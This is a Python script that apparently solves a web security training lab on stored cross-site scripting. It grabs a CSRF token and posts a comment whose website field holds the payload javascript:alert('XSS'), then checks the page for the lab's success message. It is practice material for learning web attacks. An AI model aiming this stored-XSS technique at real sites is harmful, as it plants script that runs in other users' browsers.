import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

def get_csrf(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    csrf_token = soup.find('input' , {'name' : 'csrf'})['value']
    return csrf_token


def xss_attack(s, url):
    # URLs
    postComment_url = url + '/post/comment'
    postId1 = url + '/post?postId=1'

    # POST COMMENT
    payload = "javascript:alert('XSS')"
    params = {
        'csrf' : get_csrf(s, postId1),
        'postId' : 1,
        'comment' : 'STORE XSS',
        'name' : 'attacker',
        'email' : 'att@cker',
        'website' : payload
    }

    r = s.post(postComment_url, data=params, verify=False, proxies=proxies)
    if "Your comment has been submitted." not in r.text:
        print("[-] Error! Could not upload the comment!")
        sys.exit(-1)
    print("[+] Comment uploaded!")

    # CHECK IF EXPLOIT WAS SUCCESSFUL
    r = s.get(postId1, verify=False, proxies=proxies)
    if "Congratulations, you solved the lab!" not in r.text:
        print("[-] Lab was not solved!")
        sys.exit(-1)
    print("[+] Exploit successful!")


def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1].strip()
    
    print("[+] ### Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded")
    print("""[+] This lab contains a stored cross-site scripting vulnerability in the comment functionality.
    
    To solve this lab, submit a comment that calls the alert function when the comment author name is clicked.""")


    xss_attack(s, url)


if __name__ == "__main__":
    main()